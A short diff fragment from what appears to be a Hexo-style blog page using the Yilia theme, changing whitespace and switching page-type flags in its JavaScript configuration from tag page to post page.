-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -312,9 +538,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
